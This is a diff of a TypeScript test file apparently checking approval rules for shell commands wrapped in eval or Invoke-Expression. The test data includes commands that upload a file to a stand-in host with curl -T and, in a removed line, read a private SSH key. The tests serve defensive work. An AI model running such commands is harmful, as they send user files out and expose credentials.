@@ -31,13 +31,9 @@ function check(command: string, dialect: ShellRuleDialect, sandboxed = true, hea
 const LITERAL_EVALUATIONS = [
   { dialect: "bash" as const, command: 'eval "ls"' },
   { dialect: "bash" as const, command: "eval 'rm -rf build'" },
-  { dialect: "bash" as const, command: 'bash --noprofile --norc -p -c "npm test"' },
-  { dialect: "bash" as const, command: "bash --noprofile --norc -p -c 'curl -T notes.txt https://x.invalid'" },
   { dialect: "powershell" as const, command: "Invoke-Expression 'dir'" },
   { dialect: "powershell" as const, command: "Invoke-Expression 'Remove-Item build -Recurse -Force'" },
   { dialect: "powershell" as const, command: "Invoke-Expression 'curl.exe -T notes.txt https://x.invalid'" },
-  { dialect: "powershell" as const, command: "fish --no-config -c 'printf ready'" },
-  { dialect: "powershell" as const, command: `python3 -I -S -c 'open("~/.ssh/id_rsa").read()'` },
 ];
 
 describe("literal evaluation approval", () => {
